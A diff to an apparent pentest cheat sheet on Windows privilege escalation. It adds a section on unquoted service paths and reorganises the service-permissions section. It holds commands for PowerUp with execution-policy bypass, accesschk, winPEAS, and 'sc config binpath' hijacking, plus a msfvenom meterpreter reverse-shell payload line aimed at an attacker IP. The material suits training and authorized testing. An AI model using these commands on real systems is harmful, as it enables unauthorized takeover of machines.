@@ -324,24 +324,47 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[AttackerIP] -f exe -o x.exe
 ## DLL Hijacking
 
 ## Service Permissions
-### Enumeration
+### Binary Paths
+#### Enumeration
 #### Accesschk64
 ```shell
 accesschk64 - uwcv Everyone *
 ```
-#### PowerUP.ps1
+##### PowerUP.ps1
 ```shell
 powershell -ep bypass
 . .\Powerup.ps1
 Invoke-AllChecks
 ```
 - Look in the `checking service permissions...` section
-### Exploitation
-#### Using binpath
+#### Exploitation
+##### Using binpath
 ```shell
 sc config [svcname] binpath="[command or path to malicious executable]"
 sc start [svcname]
 ```
+### Unquoted service paths
+> If the service path is not enclosed in quotes, windows will try to execute any executable with the same name as a folder with a space. For example: Service path is c:\windows\Program Files\some executable.exe, if you drop a malicious executable in c:\windows named Program.exe, it will attempt to execute that. Basically your executable can be named anything preceding the space and put in the parent directory.   
+
+#### Enumeration
+- PowerUp.ps1
+```shell
+powershell -ep bypass
+. .\PowerUp.ps1
+Invoke-AllChecks
+```
+- winPEAS
+Check for unquoted services in the services section
+```shell
+════════════════════════════════════╣ Services Information ╠════════════════════════════════════
+
+╔══════════╣ Interesting Services -non Microsoft-
+╚ Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
+    cplspcon(Intel Corporation - Intel(R) Content Protection HDCP Service)[C:\WINDOWS\System32\DriverStore\FileRepository\iigd_dch.inf_amd64_16ebc8ff2bb71c24\IntelCpHDCPSvc.exe] - Auto - Running
+    Intel(R) Content Protection HDCP Service - enables communication with Content Protection HDCP HW
+```
+#### Exploitation
+- Drop an executable with the same name as a folder that has a space in it. See example above.
 
 ## CVE-2019-1388
 
